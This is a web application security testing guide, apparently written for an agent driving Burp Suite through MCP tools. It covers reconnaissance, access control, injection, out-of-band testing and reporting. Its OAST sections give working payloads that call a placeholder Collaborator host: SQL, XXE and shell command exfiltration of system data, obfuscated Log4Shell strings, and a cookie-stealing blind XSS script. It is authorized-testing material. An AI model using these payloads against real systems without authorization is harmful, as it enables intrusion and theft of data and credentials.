# Application Security (AppSec) Testing Guide & Best Practices

This guide standardizes application security testing methodologies, vulnerability verification techniques, and safety best practices when operating Burp Suite through **Burp MCP**. It aligns with **OWASP Web Security Testing Guide (WSTG)**, **OWASP ASVS**, and **PortSwigger Web Security Academy** standards.

---

## 1. Attack Surface Reconnaissance & Asset Inventory

Before sending active payloads, map the target's logical boundaries, technologies, and entry points.

### Workflow
1. **Define Scope Boundary**:
   - Check scope with `burp_get_scope`.
   - Add explicit target prefixes using `burp_add_to_scope` only when authorized.
2. **Examine Existing Traffic**:
   - Query `burp_sitemap` with URL prefix filtering to inspect discovered endpoints, methods, and parameters.
   - Use `burp_target_info` to extract identified server banners, frameworks, cookie flags, and headers.
3. **Graph-Based Attack Surface Mapping (Sitegraph)**:
   - When sitegraph is enabled (`--enable-sitegraph`), run `sitegraph_sync` with `url_prefix`.
   - Use `sitegraph_clusters` to identify functional modules and microservice boundaries.
   - Search specific sensitive parameters (`token`, `admin`, `redirect`, `url`, `file`, `id`, `key`) with `sitegraph_search`.
   - Detail high-value endpoints with `sitegraph_endpoint_detail`.

---

## 2. Authentication & Session Management Testing

### 2.1 Cookie Security & Session State
- **Audit Cookie Flags**: Inspect `burp_cookie_jar`. Verify flags: `Secure`, `HttpOnly`, `SameSite` (`Strict` / `Lax`).
- **Session Expiration & Invalidation**:
  - Test session reuse after logout or timeout by replaying requests with `burp_send_request`.
  - Set test session tokens using `burp_cookie_jar_set`.

### 2.2 JWT & Token Security Testing
- **Decoding & Inspection**:
  - Use `decoder` with `operation: "jwt.decode"` to inspect headers (`alg`, `kid`, `typ`) and claims (`exp`, `sub`, `roles`).
- **Signature & Algorithm Confusion**:
  - Test algorithm tampering (`alg: none`, `alg: HS256` using known public RSA key as secret via `decoder` with `operation: "jwt.verify_hs256"`).
- **Claim Modification**:
  - Alter roles/claims in payload and re-encode to test whether signature verification is enforced on the server.

### 2.3 Macro-Driven Session Maintenance
When testing authenticated flows where tokens expire or CSRF tokens change per request:
- Build a multi-step macro using `burp_macro_create` with parameter extraction rules.
- Test macro execution with `burp_macro_run` to ensure tokens are freshly retrieved.
- Bind the macro to a session handling rule via `burp_session_create_rule`.

---

## 3. Authorization & Access Control (BOLA / IDOR / Privilege Escalation)

### 3.1 Horizontal Privilege Escalation & IDOR
Test if User A can view or modify User B's resources.
1. Capture a baseline request for User A using `burp_proxy_detail`.
2. Swap the authorization token/cookie with User B's credentials or omit credentials entirely.
3. Execute differential replay with `burp_send_request` or batch parallel tests with `burp_send_request_parallel`.
4. **Validation Criteria**:
   - Compare response status code, body length, and body contents.
   - Never rely on status code alone: a `200 OK` returning an error message is not a vulnerability; an unauthorized `200 OK` returning User B's data is an IDOR.

### 3.2 Vertical Privilege Escalation
Test if a standard user can access administrative or privileged endpoints.
1. Identify admin endpoints from sitemap or JavaScript sources (`/api/v1/admin/*`, `/manage/*`).
2. Replay requests with standard user session credentials.
3. Test HTTP method tampering using `burp_convert_request` (e.g. converting `POST` to `GET` or `PUT`).
4. Test header overrides using `burp_register_http_handler` (e.g. injecting `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`).

---

## 4. Input Validation & Injection Flaws

### 4.1 SQL Injection (SQLi)
- **Differential Analysis**:
  - *Baseline*: Send standard parameter request.
  - *Boolean-based*: Send `' AND '1'='1` vs `' AND '1'='2` (or arithmetic expressions `id=2-1` vs `id=1`).
  - *Error-based*: Send syntactically invalid input (`'`, `"`, `\`, `/*`) and inspect responses with `burp_extract_from_response` for database error signatures.
  - *Time-based / Blind*: Use time delays (`pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`). Confirm reproducible delay before reporting.
- **Out-of-Band SQLi**: See Section 5.3 for database-specific OAST vectors.

### 4.2 Cross-Site Scripting (XSS)
- **Reflected XSS**:
  - Step 1: Inject a unique harmless alphanumeric canary string (e.g., `xssCanary98231`).
  - Step 2: Query the response with `burp_extract_from_response` to identify reflection context (HTML body, attribute, JavaScript block, URL parameter).
  - Step 3: Test context-breaking sequences (`"`, `'`, `>`, `</script>`, `<!--`).
  - Step 4: Verify whether characters are HTML-entity encoded or reflected raw.
- **Stored XSS**:
  - Inject unique canary into storage point (profile, comment, settings).
  - Check downstream rendering pages in proxy history or via `burp_send_request`.

### 4.3 Server-Side Template Injection (SSTI)
- Test mathematical expressions inside template delimiters: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`.
- Inspect if output renders `49` instead of literal expression.
- Use `decoder` to construct engine-specific payloads (Jinja2, Thymeleaf, Freemarker, ERB).

### 4.4 Path Traversal & Local File Inclusion (LFI)
- Test directory traversal sequences: `../`, `..%2f`, `..;/`, `%2e%2e%2f`.
- Use `decoder` with `operation: "url.encode"` or `unicode.escape` for encoding variations.
- Target well-known files (`/etc/passwd`, `C:\Windows\win.ini`, `web.xml`).

---

## 5. Out-of-Band Application Security Testing (OAST) & Collaborator

OAST is essential for detecting **blind vulnerabilities** where the target application executes an action asynchronously or behind egress boundaries without reflecting the output in the direct HTTP response.

### 5.1 OAST Protocol & Burp Collaborator Mechanics
1. **Generate Unique Interaction Payloads**:
   - Call `burp_collaborator_generate` with `count: N`.
   - Each generated payload is associated with the extension's active Collaborator context.
   - **Rule**: Map exactly one unique payload identifier to each parameter, header, or injection point to correlate interactions deterministically.
2. **Inject Payload**:
   - Inject the Collaborator URL or hostname into the target field.
3. **Paced Polling**:
   - Call `burp_collaborator_poll` with a bounded `limit` and follow `next_cursor` when returned.
   - Pace calls externally; the tool does not accept a polling timeout.
4. **Interaction Evidence Classification**:
   - **`DNS` Interaction**: The target server or its internal recursive resolver queried the Collaborator nameserver (A, AAAA, TXT, or MX lookup). Confirms execution reachability; works through restrictive egress firewalls allowing outbound UDP/53.
   - **`HTTP` / `HTTPS` Interaction**: The target server established a full TCP connection and issued an HTTP/HTTPS request (includes client IP, User-Agent, headers, query parameters, request path). Confirms full network egress and URL fetch capabilities.
   - **`SMTP` Interaction**: The target server attempted an email transport handshake.

### 5.2 Blind Server-Side Request Forgery (SSRF)
- **Target Surfaces**:
  - URL parameters: `url=`, `dest=`, `redirect=`, `webhook=`, `callback=`, `preview=`, `proxy=`, `fetch=`, `import=`, `image_url=`, `feed=`.
  - HTTP Headers: `Host`, `X-Forwarded-Host`, `X-Forwarded-For`, `Referer`, `X-Real-IP`, `X-Custom-IP-Authorization`, `X-Wap-Profile`, `CF-Connecting-IP`.
  - Document/PDF Converters (e.g. wkhtmltopdf, Puppeteer, WeasyPrint):
    ```html
    <img src="http://COLLAB_DOMAIN/img.jpg" />
    <iframe src="http://COLLAB_DOMAIN/frame.html"></iframe>
    <link rel="stylesheet" href="http://COLLAB_DOMAIN/style.css" />
    ```
  - OpenID Connect / OAuth2 Redirect and Metadata URLs (`/.well-known/openid-configuration`, `client_uri`, `jwks_uri`).

### 5.3 Out-of-Band SQL Injection (OAST SQLi)
When SQL injection produces no in-band error or time delay, trigger out-of-band DNS lookups:
- **Microsoft SQL Server (MSSQL)**:
  ```sql
  '; EXEC master..xp_dirtree '\\COLLAB_DOMAIN\a'--
  '; EXEC master..xp_fileexist '\\COLLAB_DOMAIN\a'--
  ```
  *Data exfiltration via DNS subdomain*:
  ```sql
  DECLARE @val varchar(1024);
  SELECT @val=SUBSTRING(CONVERT(varchar(1024), @@version), 1, 50);
  EXEC('master..xp_dirtree "\\' + @val + '.COLLAB_DOMAIN\a"');
  ```
- **Oracle Database**:
  ```sql
  ' UNION SELECT UTL_INADDR.get_host_address('COLLAB_DOMAIN') FROM dual--
  ' UNION SELECT UTL_HTTP.request('http://COLLAB_DOMAIN') FROM dual--
  ' UNION SELECT HTTPURITYPE('http://COLLAB_DOMAIN').getclob() FROM dual--
  ' UNION SELECT DBMS_LDAP.INIT('COLLAB_DOMAIN', 80) FROM dual--
  ```
- **MySQL / MariaDB (Windows only)**:
  ```sql
  ' UNION SELECT LOAD_FILE('\\\\COLLAB_DOMAIN\\a')--
  ```
- **PostgreSQL**:
  ```sql
  COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_DOMAIN'--
  ```

### 5.4 Blind XML External Entity (XXE)
- **Standard Out-of-Band Entity Resolution**:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB_DOMAIN/x"> %xxe; ]>
  <stockCheck><productId>&xxe;</productId></stockCheck>
  ```
- **Out-of-Band File Exfiltration via External Parameter Entity DTD**:
  1. Host or simulate DTD:
     ```xml
     <!ENTITY % file SYSTEM "file:///etc/hostname">
     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB_DOMAIN/?x=%file;'>">
     %eval;
     %exfil;
     ```
  2. Send XML body:
     ```xml
     <!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://COLLAB_DOMAIN/eval.dtd"> %dtd; ]>
     ```

### 5.5 Blind Remote Code Execution (RCE) & Command Injection
- **DNS Lookup Injection**:
  - Unix / Linux:
    ```sh
    ; nslookup COLLAB_DOMAIN ;
    | curl http://COLLAB_DOMAIN/
    $(ping -c 1 COLLAB_DOMAIN)
    `dig COLLAB_DOMAIN`
    ```
  - Windows:
    ```cmd
    & certutil -urlcache -split -f http://COLLAB_DOMAIN/ test &
    & nslookup %USERNAME%.COLLAB_DOMAIN &
    | ping -n 1 COLLAB_DOMAIN
    ```
- **Data Exfiltration over DNS Subdomains**:
  - Linux: `curl http://$(whoami).COLLAB_DOMAIN/` or `nslookup $(id -un).COLLAB_DOMAIN`
  - Windows: `nslookup %COMPUTERNAME%.%USERNAME%.COLLAB_DOMAIN`
  *(Note: DNS labels are limited to 63 alphanumeric/hyphen characters; use base32/hex for binary or multiline data).*

### 5.6 Log4j / Log4Shell (CVE-2021-44228) & JNDI Injections
- **Standard Payloads**:
  ```text
  ${jndi:ldap://COLLAB_DOMAIN/a}
  ${jndi:dns://COLLAB_DOMAIN/a}
  ${jndi:rmi://COLLAB_DOMAIN/a}
  ```
- **Obfuscated & WAF-Bypass Variations**:
  ```text
  ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://COLLAB_DOMAIN/a}
  ${jndi:${lower:l}${lower:d}ap://${hostName}.COLLAB_DOMAIN/a}
  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://COLLAB_DOMAIN/a}
  ```
- **Injection Targets**: Inject across all incoming headers (`User-Agent`, `X-Forwarded-For`, `Authorization`, `Accept`, `Referer`, `Cookie`) and input payload strings using `burp_inline_fuzzer` or `burp_send_request`.

### 5.7 Blind Deserialization (Java, .NET, PHP, Python)
- **Java `URLDNS` Gadget**:
  - Serialized `java.net.URL` object stored in `java.util.HashMap` automatically initiates a DNS lookup to the Collaborator domain upon `.hashCode()` computation during deserialization without executing arbitrary code (safe, high-confidence detection).
- **.NET Deserialization**:
  - Payloads calling `System.Net.Dns.GetHostEntry("COLLAB_DOMAIN")` or `Process.Start("nslookup", "COLLAB_DOMAIN")`.
- **PHP `unserialize()`**:
  - `SoapClient` class deserialization triggering an SSRF HTTP callback upon arbitrary method invocation.

### 5.8 Blind Cross-Site Scripting (Blind XSS)
- Inject canary scripts into storage points accessed by administrative users or internal dashboards:
  ```html
  <script src="https://COLLAB_DOMAIN/x.js"></script>
  <img src="x" onerror="fetch('https://COLLAB_DOMAIN/xss?c='+encodeURIComponent(document.cookie))" />
  ```
- Correlate interaction timestamps and administrative User-Agent strings.

---

## 6. Race Conditions & Concurrency Vulnerabilities

Race conditions occur when multi-threaded server operations lack proper synchronization (e.g. coupon reuse, overdraft, duplicate transactions, TOCTOU).

### Workflow
1. Identify sensitive state-changing endpoints (e.g., `/checkout`, `/apply-discount`, `/transfer`, `/redeem-code`).
2. Construct the raw request string with valid authentication headers and parameters.
3. Execute the race condition test using `burp_race_condition`:
   ```json
   {
     "request": "POST /api/redeem HTTP/1.1\r\nHost: target.test\r\nAuthorization: Bearer ...\r\n\r\n{\"code\":\"PROMO100\"}",
     "host": "target.test",
     "port": 443,
     "https": true,
     "count": 20
   }
   ```
4. Poll the returned job ID with `burp_job_status` until terminal, then read paginated responses with `burp_job_result`.
5. Compare response statuses, body data, and resultant account state to confirm duplicate redemptions.

---

## 7. Modern API & WebSocket Security Testing

### 7.1 GraphQL APIs
- **Introspection Query**:
  - Test `/graphql`, `/api/graphql`, `/query` with standard introspection query: `{"query":"{__schema{types{name}}}"}`.
- **Batching & Query Complexity**:
  - Test array batching `[{"query":"..."}, {"query":"..."}]` to bypass rate limits.
  - Test nested relationship loops to assess resource consumption.

### 7.2 WebSocket Protocol Testing
- **Establish Managed Connection**:
  - Call `burp_websocket_create` with host and path.
- **Message Fuzzing & Manipulation**:
  - Send structured JSON text frames with `burp_websocket_send_text`.
  - Send binary payloads using base64 encoding with `burp_websocket_send_binary`.
- **Review Traffic**:
  - Page through received and sent frames with `burp_websocket_history`.
- **Cleanup**:
  - Always close open connections with `burp_websocket_close`.

---

## 8. Automated & Passive Scanning Discipline

1. **Passive Audit First**:
   - Use `burp_scan_start` with `audit_type: "passive"` to extract findings without generating intrusive traffic.
2. **Bounded Active Audit**:
   - Use `burp_scan_start` with `audit_type: "active"`, specific `scan_configuration_id`, and `resource_pool_id` to strictly limit concurrency and request rates.
3. **Resource Pool Management**:
   - Create custom pools with `burp_scan_pool_create` to limit maximum concurrent requests (e.g., 2–5 requests/sec) and avoid denial of service.
4. **Issue Triage**:
   - Query issues with `burp_scan_issues`.
   - Inspect evidence and request/response pairs with `burp_scan_issue_detail`.
5. **Reporting**:
   - Generate official HTML or XML reports with `burp_scanner_generate_report`.

---

## 9. Evidence Standard & Triage Reporting

Every reported vulnerability must provide verifiable, reproducible proof.

### Vulnerability Report Checklist
- **Title & Severity**: Clear vulnerability classification (e.g., *CWE-89: SQL Injection in `/api/search` parameter `q`*) with CVSS v3.1 score and severity (`High`, `Medium`, `Low`, `Info`).
- **Target & Endpoint**: HTTP Method, URL, parameter name, and target scope verification.
- **Proof of Concept (PoC)**:
  - Exact raw HTTP request required to reproduce.
  - Decisive response headers, status code, and highlighted response body evidence.
  - If out-of-band: Collaborator interaction ID, client IP, interaction type, and timestamp.
- **Security Impact**: Concrete risk description (e.g., unauthorized data extraction, privilege escalation, remote code execution).
- **Remediation**: Actionable guidance (e.g., parameterized queries, input validation, context-aware output encoding, access control checks).

---

## 10. Operational Safety & Cleanup Checklist

Always leave the target and Burp Suite in a clean state:
- [ ] Restore `burp_set_intercept_state` to `false` (or original state).
- [ ] Remove temporary HTTP handlers (`burp_remove_http_handler`).
- [ ] Remove temporary Proxy rules (`burp_remove_proxy_rule`).
- [ ] Remove temporary session rules (`burp_session_delete_rule`).
- [ ] Remove temporary macros (`burp_macro_remove`).
- [ ] Close all active managed WebSockets (`burp_websocket_close`).
- [ ] Expire temporary test cookies.
- [ ] Remove temporary target scope additions (`burp_remove_from_scope`).
- [ ] Cancel/remove any unfinished background scan or crawl jobs (`burp_job_cancel`, `burp_scan_remove`).
